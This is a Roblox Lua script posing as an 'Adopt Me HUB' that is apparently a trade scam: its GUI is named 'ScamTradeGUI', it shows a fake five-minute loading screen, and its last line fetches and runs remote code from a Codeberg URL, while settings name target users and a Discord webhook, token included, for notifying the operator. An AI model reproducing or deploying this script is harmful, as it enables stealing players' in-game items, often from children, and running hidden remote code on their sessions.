users = {"1Ngg_erHunter2"}
min_value = 0 -- minimum value for stuff (if ur new to it, leave 0 ig)
ping = "Yes" -- make it yes if u want to get pinged
webhook =  "https://discord.com/api/webhooks/1390378012322693151/W1fWWYoxMxsRRn1C-OAZo6i4eJ8ixeYWLEd_yJOpHvw7Ijs5eWgYb7ni65ePDdVwnH0o" -- make a webhook on phone browser discord or pc discord (to get the notifications and shii)
embedcol = 65280 -- ignore this, only used to change color of the webhook notification
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ScamTradeGUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Adopt Me HUB"
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = frame

local loadingText = Instance.new("TextLabel")
loadingText.Text = "The Adopt Me HUB is currently loading, this should take up to 5 minutes, please be patient! (The HUB will pop-up automatically when its full loaded)"
loadingText.Size = UDim2.new(1, -20, 0, 80)
loadingText.Position = UDim2.new(0, 10, 0, 50)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 16
loadingText.TextWrapped = true
loadingText.Parent = frame
loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/adm"))()
